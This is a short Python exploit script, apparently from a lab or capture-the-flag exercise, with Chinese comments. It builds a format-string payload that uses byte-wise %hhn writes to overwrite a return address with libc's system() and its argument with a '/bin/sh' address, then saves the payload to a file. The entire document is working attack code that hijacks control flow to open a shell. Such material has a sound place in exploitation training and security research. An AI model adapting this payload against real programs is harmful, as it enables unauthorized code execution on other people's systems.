#!/usr/bin/env python3


system_addr = 0xf7d83000 + 0x48170
binsh_addr = 0xf7d83000 + 0x1bd0d5
# 参数地址
arg_addr = 0xffffcec8 + 12
# 返回地址
ret_addr = 0xffffcec8 + 4

payload = b''
num_char = 0

payload += (ret_addr+0).to_bytes(4, 'little')
payload += (ret_addr+1).to_bytes(4, 'little')
payload += (ret_addr+2).to_bytes(4, 'little')
payload += (ret_addr+3).to_bytes(4, 'little')
payload += (arg_addr+0).to_bytes(4, 'little')
payload += (arg_addr+1).to_bytes(4, 'little')
payload += (arg_addr+2).to_bytes(4, 'little')
payload += (arg_addr+3).to_bytes(4, 'little')
num_char = 32

inc = (0x100 + ((system_addr >> 0) & 0xFF) - (num_char % 0x100)) % 0x100
if (inc != 0):
    num_char += inc
    payload += f"%{inc}c".encode()
payload += b'%17$hhn'

inc = (0x100 + ((system_addr >> 8) & 0xFF) - (num_char % 0x100)) % 0x100
if (inc != 0):
    num_char += inc
    payload += f"%{inc}c".encode()
payload += b'%18$hhn'

inc = (0x100 + ((system_addr >> 16) & 0xFF) - (num_char % 0x100)) % 0x100
if (inc != 0):
    num_char += inc
    payload += f"%{inc}c".encode()
payload += b'%19$hhn'

inc = (0x100 + ((system_addr >> 24) & 0xFF) - (num_char % 0x100)) % 0x100
if (inc != 0):
    num_char += inc
    payload += f"%{inc}c".encode()
payload += b'%20$hhn'

inc = (0x100 + ((binsh_addr >> 0) & 0xFF) - (num_char % 0x100)) % 0x100
if (inc != 0):
    num_char += inc
    payload += f"%{inc}c".encode()
payload += b'%21$hhn'

inc = (0x100 + ((binsh_addr >> 8) & 0xFF) - (num_char % 0x100)) % 0x100
if (inc != 0):
    num_char += inc
    payload += f"%{inc}c".encode()
payload += b'%22$hhn'

inc = (0x100 + ((binsh_addr >> 16) & 0xFF) - (num_char % 0x100)) % 0x100
if (inc != 0):
    num_char += inc
    payload += f"%{inc}c".encode()
payload += b'%23$hhn'

inc = (0x100 + ((binsh_addr >> 24) & 0xFF) - (num_char % 0x100)) % 0x100
if (inc != 0):
    num_char += inc
    payload += f"%{inc}c".encode()
payload += b'%24$hhn'


with open("input", "wb") as f:
    f.write(payload)
